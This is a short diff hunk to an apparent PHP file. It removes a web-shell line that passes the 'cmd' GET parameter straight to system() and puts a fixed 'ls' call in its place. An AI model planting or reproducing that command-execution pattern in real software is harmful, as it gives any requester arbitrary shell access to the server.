@@ -48,7 +48,7 @@
     <?php
     if(isset($_GET['cmd']))
     {
-        system($_GET['cmd']);
+        system('ls');
     }
     echo "got ephph exec";
 ?>
